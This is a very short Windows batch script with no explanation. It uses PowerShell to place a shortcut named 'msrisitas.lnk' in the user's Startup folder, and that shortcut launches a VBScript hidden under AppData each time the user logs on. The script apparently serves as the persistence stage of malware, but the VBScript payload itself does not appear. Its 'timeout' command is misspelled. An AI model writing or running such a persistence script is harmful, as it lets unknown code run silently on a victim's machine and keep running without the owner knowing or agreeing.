@echo off

powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\msrisitas.lnk');$s.TargetPath='%appdata%\msrisitas\msrisitas.vbs';$s.Save()"

timout /t 2 >nul
exit